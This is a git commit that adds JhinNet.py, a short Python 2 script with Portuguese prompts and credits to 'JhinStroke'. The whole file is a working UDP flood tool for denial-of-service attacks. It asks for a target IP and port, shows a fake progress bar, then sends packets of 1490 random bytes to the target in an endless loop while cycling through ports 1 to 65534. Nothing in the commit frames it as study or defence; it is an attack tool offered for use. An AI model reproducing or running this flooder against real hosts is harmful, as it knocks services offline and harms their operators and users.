4f64e10e18af6c5c347691767d6639c4fa412d49
CHK-source <68204151+CHK-source@users.noreply.github.com>
2021-01-29 09:33:57 -0300

    Add files via upload

---
+++ JhinNet.py
@@ -0,0 +1,50 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("JhinNet")
+print
+print "Criado Por   : JhinStroke"
+print "YouTube : https://www.youtube.com/c/JhinStroke"
+print "GitHub   : https://github.com/JhinStroke"
+print
+ip = raw_input("Endereço IP : ")
+port = input("Porta       : ")
+
+os.system("clear")
+os.system("JhinNetAttack")
+print "[                    ] 0%"
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Enviando %s Bots %s Para a Porta:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
